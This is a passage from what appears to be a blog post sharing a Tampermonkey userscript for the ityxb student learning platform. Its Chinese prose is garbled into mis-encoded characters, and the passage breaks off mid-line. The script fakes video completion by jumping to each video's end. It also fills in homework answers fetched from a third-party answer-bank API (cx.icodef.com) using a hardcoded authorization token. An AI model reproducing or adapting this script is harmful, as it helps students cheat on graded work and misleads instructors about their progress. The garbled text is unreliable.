å¹³å°ï¼Œå¹¶ç™»å½•ä½ çš„è´¦å·ã€‚</li><li>åœ¨è§†é¢‘æ’­æ”¾é¡µé¢ï¼Œå¯åŠ¨å°åŠ©æ‰‹æ’ä»¶ã€‚</li><li>å°åŠ©æ‰‹ä¼šè‡ªåŠ¨æ£€æµ‹å½“å‰è§†é¢‘çš„è¿›åº¦ï¼Œå¹¶è·³è¿‡å·²è§‚çœ‹çš„éƒ¨åˆ†ã€‚</li><li>å½“é‡åˆ°é¢˜ç›®æ—¶ï¼Œå°åŠ©æ‰‹ä¼šè‡ªåŠ¨ä»ä¸€ä¹‹é¢˜åº“è·å–ç­”æ¡ˆï¼Œå¹¶å¡«å†™åœ¨ç­”é¢˜æ¡†ä¸­ã€‚</li><li>å®Œæˆæ‰€æœ‰é¢˜ç›®åï¼Œä½ å¯ä»¥ç»§ç»­è§‚çœ‹è§†é¢‘ï¼Œæˆ–è€…æ ¹æ®éœ€è¦è‡ªè¡Œæ“ä½œã€‚</li></ol><h2 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h2><ul><li>æœ¬å°åŠ©æ‰‹ä»…ä¾›å­¦ä¹ å’Œå‚è€ƒä½¿ç”¨ï¼Œè¯·å‹¿ç”¨äºéæ³•ç”¨é€”ã€‚</li><li>ä½¿ç”¨æœ¬å°åŠ©æ‰‹å¯èƒ½è¿åä¼ æ™ºæ’­å®¢çš„ä½¿ç”¨è§„å®šï¼Œè¯·è‡ªè¡Œæ‰¿æ‹…é£é™©ã€‚</li><li>å¯¹æ¥ä¸€ä¹‹é¢˜åº“éœ€è¦æä¾›åˆæ³•çš„è´¦å·ä¿¡æ¯ï¼Œè¯·ç¡®ä¿ä½ çš„è´¦å·åˆæ³•æœ‰æ•ˆã€‚</li></ul><h2 id="å…è´£å£°æ˜"><a href="#å…è´£å£°æ˜" class="headerlink" title="å…è´£å£°æ˜"></a>å…è´£å£°æ˜</h2><p>æœ¬å°åŠ©æ‰‹ä»…ä¸ºä¸ªäººå¼€å‘é¡¹ç›®ï¼Œä¸å¯¹ä½¿ç”¨è¯¥è½¯ä»¶äº§ç”Ÿçš„ä»»ä½•é—®é¢˜è´Ÿè´£ã€‚ä½¿ç”¨æœ¬å°åŠ©æ‰‹å³ä»£è¡¨æ‚¨å·²ç»é˜…è¯»å¹¶åŒæ„è‡ªè¡Œæ‰¿æ‹…ä½¿ç”¨é£é™©ã€‚</p><h2 id="è”ç³»æ–¹å¼"><a href="#è”ç³»æ–¹å¼" class="headerlink" title="è”ç³»æ–¹å¼"></a>è”ç³»æ–¹å¼</h2><p>å¦‚æœ‰ä»»ä½•é—®é¢˜æˆ–å»ºè®®ï¼Œæ¬¢è¿è”ç³» colincoraï¼š</p><ul><li>é‚®ç®±ï¼š<a href="mailto:&#51;&#x33;&#48;&#x30;&#53;&#49;&#57;&#x31;&#x36;&#49;&#64;&#x71;&#113;&#46;&#x63;&#111;&#x6d;">&#51;&#x33;&#48;&#x30;&#53;&#49;&#57;&#x31;&#x36;&#49;&#64;&#x71;&#113;&#46;&#x63;&#111;&#x6d;</a></li><li>å¾®ä¿¡ï¼šREMINAX</li></ul><h2 id="è´¡çŒ®è€…"><a href="#è´¡çŒ®è€…" class="headerlink" title="è´¡çŒ®è€…"></a>è´¡çŒ®è€…</h2><ul><li>colincora</li></ul><p>æ„Ÿè°¢æ‰€æœ‰ä¸ºè¿™ä¸ªé¡¹ç›®åšå‡ºè´¡çŒ®çš„äººï¼</p><h2 id="æˆæƒè®¸å¯"><a href="#æˆæƒè®¸å¯" class="headerlink" title="æˆæƒè®¸å¯"></a>æˆæƒè®¸å¯</h2><p>è¯¥é¡¹ç›®é‡‡ç”¨ <a href="https://opensource.org/licenses/MIT">MIT</a> å¼€æºè®¸å¯è¯ã€‚è¯·æŸ¥é˜…è®¸å¯è¯æ–‡ä»¶ä»¥è·å–æ›´å¤šä¿¡æ¯ã€‚</p><p><strong>ç¥ä½ å­¦ä¹ æ„‰å¿«ï¼ğŸ˜„</strong></p><h2 id="è„šæœ¬ä»£ç "><a href="#è„šæœ¬ä»£ç " class="headerlink" title="è„šæœ¬ä»£ç "></a>è„šæœ¬ä»£ç </h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ==UserScript==</span></span><br><span class="line"><span class="comment">// @name         colincoraçš„ä¼ æ™ºæ’­å®¢å°åŠ©æ‰‹</span></span><br><span class="line"><span class="comment">// @namespace    *.com</span></span><br><span class="line"><span class="comment">// @version      9.9.9</span></span><br><span class="line"><span class="comment">// @description  coliné­”æ”¹ è·³è§†é¢‘+è‡ªåŠ¨ç­”é¢˜  ä¸€åæ¥è‡ªä¿å®šå­¦é™¢æ»´å­¦ç”Ÿåˆ¶ä½œ Q3300519161</span></span><br><span class="line"><span class="comment">// @author       colincora</span></span><br><span class="line"><span class="comment">// @match        https://stu.ityxb.com/preview/detail/*</span></span><br><span class="line"><span class="comment">// @namespace    https://stu.ityxb.com/writePaper/busywork/*</span></span><br><span class="line"><span class="comment">// @match        https://stu.ityxb.com/writePaper/busywork/*</span></span><br><span class="line"><span class="comment">// @match        https://stu.ityxb.com/lookPaper/busywork/*</span></span><br><span class="line"><span class="comment">// @grant        GM_xmlhttpRequest</span></span><br><span class="line"><span class="comment">// @grant        GM_addStyle</span></span><br><span class="line"><span class="comment">// @grant        GM_log</span></span><br><span class="line"><span class="comment">// @icon         https://tch.ityxb.com/favicon.ico</span></span><br><span class="line"><span class="comment">// ==/UserScript==</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> tibody;<span class="comment">//é¢˜ç›®æ•°ç»„</span></span><br><span class="line"><span class="keyword">var</span> total = <span class="number">0</span>;<span class="comment">//é¢˜ç›®æ€»æ•°é‡</span></span><br><span class="line"><span class="keyword">var</span> index = <span class="number">0</span>;<span class="comment">//æœé¢˜ç´¢å¼•è‡ªåŠ¨å¢åŠ </span></span><br><span class="line"> <span class="keyword">let</span> url = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;æ¬¢è¿ä½¿ç”¨colincoraä¼ æ™ºæ’­å®¢å°åŠ©æ‰‹ï¼ä½œè€…QQ3300519161&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(url.<span class="title function_">includes</span>(<span class="string">&quot;https://stu.ityxb.com/preview/detail/&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">const</span> courseName = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;p.course-name&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (courseName) &#123;</span><br><span class="line">  courseName.<span class="property">textContent</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;è¿™æ˜¯é¢„ä¹ ä½œä¸šç­”é¢˜éƒ¨åˆ†ï¼&#x27;</span>);</span><br><span class="line">            <span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="comment">//    var bgdiv = document.getElementsByClassName(&quot;question-info-box&quot;);</span></span><br><span class="line"><span class="comment">//bgdiv.style.background = &quot;url(&#x27;https://i.postimg.cc/BZKZRRtJ/20220508084230592.jpg&#x27;)&quot;;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//tibody=document.getElementsByClassName(&quot;question-title-box&quot;);</span></span><br><span class="line"><span class="comment">//total = tibody.length;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                  <span class="comment">// åˆ›å»ºä¸€ä¸ªæ–°çš„ div å…ƒç´ </span></span><br><span class="line">                 <span class="keyword">let</span> newDiv = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">                 <span class="comment">// ç»™å®ƒä¸€äº›å†…å®¹</span></span><br><span class="line">                 <span class="keyword">let</span> newContent = <span class="variable language_">document</span>.<span class="title function_">createTextNode</span>(<span class="string">&quot;colincoraï¼Q3300519161&quot;</span>);</span><br><span class="line">                 <span class="comment">// æ·»åŠ æ–‡æœ¬èŠ‚ç‚¹ åˆ°è¿™ä¸ªæ–°çš„ div å…ƒç´ </span></span><br><span class="line">                 newDiv.<span class="title function_">appendChild</span>(newContent);</span><br><span class="line">                 newDiv.<span class="property">style</span>.<span class="property">position</span>=<span class="string">&#x27;fixed&#x27;</span>;</span><br><span class="line">                 newDiv.<span class="property">style</span>.<span class="property">backgroundColor</span>=<span class="string">&#x27;red&#x27;</span></span><br><span class="line">                <span class="comment">//  newDiv.style.width=&#x27;20px&#x27;;</span></span><br><span class="line">                <span class="comment">//  newDiv.style.length=&#x27;20px&#x27;;</span></span><br><span class="line">                newDiv.<span class="property">style</span>.<span class="property">fontSize</span>=<span class="string">&#x27;28px&#x27;</span>;</span><br><span class="line">   <span class="comment">// document.querySelector(&quot;#beginHeaderNav&quot;).appendChild(newDiv);</span></span><br><span class="line">                newDiv.<span class="property">style</span>.<span class="property">top</span>=<span class="string">&#x27;60px&#x27;</span>;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">zhongzhuan</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> bgdiv = <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&quot;question-info-box&quot;</span>);</span><br><span class="line">    tibody=<span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&quot;question-title-box&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(tibody)</span><br><span class="line">    total = tibody.<span class="property">length</span>;</span><br><span class="line">    <span class="title function_">kaishi</span>(tibody[index]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">kaishi</span>(<span class="params">ti</span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> text=<span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&quot;question-title-box&quot;</span>)[<span class="number">0</span>].<span class="property">innerText</span>.<span class="title function_">substring</span>(<span class="number">4</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(text);</span><br><span class="line">        <span class="title function_">GM_xmlhttpRequest</span>(&#123;<span class="comment">//æ²¹çŒ´è„šæœ¬æä¾›çš„å¼‚æ­¥å‡½æ•°</span></span><br><span class="line">            <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">            <span class="attr">url</span>: <span class="string">&#x27;http://cx.icodef.com/wyn-nb?v=4&#x27;</span>,<span class="comment">//ç½‘è¯¾æ¥å£</span></span><br><span class="line">            <span class="attr">headers</span>: &#123;</span><br><span class="line">                <span class="string">&#x27;Content-type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;Authorization&#x27;</span>: <span class="string">&#x27;NLUIeWEHQHBAapeH&#x27;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">data</span>: <span class="string">&#x27;question=&#x27;</span>+ <span class="built_in">encodeURIComponent</span>(<span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&quot;question-title-box&quot;</span>)[<span class="number">0</span>].<span class="property">innerText</span>.<span class="title function_">substring</span>(<span class="number">4</span>)),</span><br><span class="line">            <span class="attr">timeout</span>: <span class="number">2000</span>,</span><br><span class="line"></span><br><span class="line">            <span class="attr">onload</span>:<span class="keyword">function</span>(<span class="params">xhr</span>)</span><br><span class="line">            &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è‡ªåŠ¨é€‰æ‹©ç­”æ¡ˆ</span></span><br><span class="line">                <span class="keyword">let</span> json=<span class="title class_">JSON</span>.<span class="title function_">parse</span>(xhr.<span class="property">responseText</span>);</span><br><span class="line">                <span class="keyword">let</span> daan=json.<span class="property">data</span>;</span><br><span class="line"><span class="keyword">if</span>(json.<span class="property">code</span>==-<span class="number">1</span>)daan=<span class="string">&quot;ç­”æ¡ˆæœªæ‰¾åˆ°&quot;</span>;</span><br><span class="line"> <span class="variable language_">console</span>.<span class="title function_">log</span>(xhr.<span class="property">responseText</span>);</span><br><span class="line"><span class="keyword">let</span> answerarray=daan.<span class="title function_">split</span>(<span class="string">&#x27;#&#x27;</span>);<span class="comment">//ç­”æ¡ˆæ•°ç»„</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;ç­”æ¡ˆæ•°ç»„ï¼š&#x27;</span>+answerarray)</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> daanlength=ti.<span class="title function_">getElementsByClassName</span>(<span class="string">&quot;radio_item question-option-item-box&quot;</span>).<span class="property">length</span>;<span class="comment">//å¤šå°‘ä¸ªé€‰é¡¹</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;daanlength;i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i2=<span class="number">0</span>;i2&lt;answerarray.<span class="property">length</span>;i2++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//  console.log(ti.getElementsByClassName(&quot;radio_item question-option-item-box&quot;)[i].innerText.split(&#x27;ã€&#x27;)[1]);</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(ti.<span class="title function_">getElementsByClassName</span>(<span class="string">&quot;radio_item question-option-item-box&quot;</span>)[i].<span class="property">innerText</span>.<span class="title function_">split</span>(<span class="string">&#x27;ã€&#x27;</span>)[<span class="number">1</span>]==answerarray[i2])ti.<span class="title function_">getElementsByClassName</span>(<span class="string">&quot;radio_item question-option-item-box&quot;</span>)[i].<span class="property">firstElementChild</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ˜¾ç¤ºç­”æ¡ˆ</span></span><br><span class="line"> <span class="keyword">let</span> newdaan=<span class="string">&#x27; &#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;answerarray.<span class="property">length</span>;i++)</span><br><span class="line"> &#123;</span><br><span class="line">     newdaan=newdaan+<span class="string">&#x27;&lt;br&gt;&#x27;</span>+answerarray[i];</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line">                <span class="keyword">var</span> text = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.question-title-text&#x27;</span>);</span><br><span class="line">                text.<span class="property">innerHTML</span>=<span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&quot;question-title-text&quot;</span>)[<span class="number">0</span>].<span class="property">innerHTML</span>+ <span class="string">&quot;&lt;br&gt;ç­”æ¡ˆ:&quot;</span>+newdaan;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(newdaan)</span><br><span class="line"> text.<span class="property">style</span>.<span class="property">color</span> = <span class="string">&quot;red&quot;</span>;</span><br><span class="line">text.<span class="property">style</span>.<span class="property">fontSize</span> = <span class="string">&quot;10px&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span>(index &lt; total - <span class="number">1</span>)<span class="comment">//ç»§ç»­æœç´¢æ¥ä¸‹æ¥çš„é¢˜</span></span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">                      index = index + <span class="number">1</span>;</span><br><span class="line">                      <span class="title function_">kaishi</span>(tibody[index]);</span><br><span class="line">&#125;, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">skipp</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> videos = <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;video&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> (videos.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">const</span> video <span class="keyword">of</span> videos) &#123;</span><br><span class="line">                video.<span class="title function_">play</span>()</span><br><span class="line">                video.<span class="property">currentTime</span> = video.<span class="property">duration</span> - <span class="number">1</span></span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">skip</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> progressBoxes = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;span.point-progress-box&#x27;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> box <span class="keyword">of</span> progressBoxes) &#123;</span><br><span class="line">    <span class="keyword">if</span> (box.<span class="property">innerHTML</span> === <span class="string">&quot;100%&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (box.<span class="property">innerHTML</span> === <span class="string">&quot;0%&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> playIcons = box.<span class="property">parentElement</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;i.icon-circle.play-ico&#x27;</span>);</span><br><span class="line">      <span class="keyword">if</span> (playIcons.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        playIcons.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">icon</span>) &#123;</span><br><span class="line">          icon.<span class="title function_">click</span>();</span><br><span class="line">        &#125;</span><br><span class="line">                         );</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">      <span class="title function_">skipp</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addAutoSkipBtn</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> autoSkipBtn = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;input&quot;</span>);</span><br><span class="line">  autoSkipBtn.<span class="title function_">setAttribute</span>(<span class="string">&quot;type&quot;</span>, <span class="string">&quot;button&quot;</span>);</span><br><span class="line">  autoSkipBtn.<span class="title function_">setAttribute</span>(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;å¼€å¯è‡ªåŠ¨è·³è¿‡è§†é¢‘&quot;</span>);</span><br><span class="line">  autoSkipBtn.<span class="title function_">setAttribute</span>(<span class="string">&quot;class&quot;</span>, <span class="string">&quot;autoSkipBtn&quot;</span>);</span><br><span class="line">  autoSkipBtn.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, toggleAutoSkip);</span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&quot;course-name&quot;</span>)[<span class="number">0</span>].<span class="title function_">appendChild</span>(autoSkipBtn);</span><br><span class="line">            <span class="keyword">var</span> div = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.course-name&#x27;</span>);</span><br><span class="line">        div.<span class="title function_">insertAdjacentHTML</span>(<span class="string">&#x27;afterend&#x27;</span>, <span class="string">&#x27;&lt;a class=&quot;button&quot;&gt;æŸ¥çœ‹ç­”æ¡ˆ&lt;/a&gt;&#x27;</span>);</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.button&#x27;</span>).<span class="property">onclick</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">         <span class="title function_">zhongzhuan</span>();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">toggleAutoSkip</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> autoSkipBtn = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;.autoSkipBtn&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (autoSkipBtn.<span class="title function_">getAttribute</span>(<span class="string">&quot;value&quot;</span>) == <span class="string">&quot;å¼€å¯è‡ªåŠ¨è·³è¿‡è§†é¢‘&quot;</span>) &#123;</span><br><span class="line">    autoSkipBtn.<span class="title function_">setAttribute</span>(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;å…³é—­è‡ªåŠ¨è·³è¿‡è§†é¢‘&quot;</span>);</span><br><span class="line">      <span class="title function_">skip1</span>()</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    autoSkipBtn.<span class="title function_">setAttribute</span>(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;å¼€å¯è‡ªåŠ¨è·³è¿‡è§†é¢‘&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">addAutoSkipBtn</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">skip1</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="built_in">setInterval</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">skip</span>();</span><br><span class="line">  &#125;, <span class="number">3000</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#125;)();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> bgdiv = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;writeQuestion&quot;</span>);</span><br><span class="line"><span class="comment">//bgdiv.style.background = 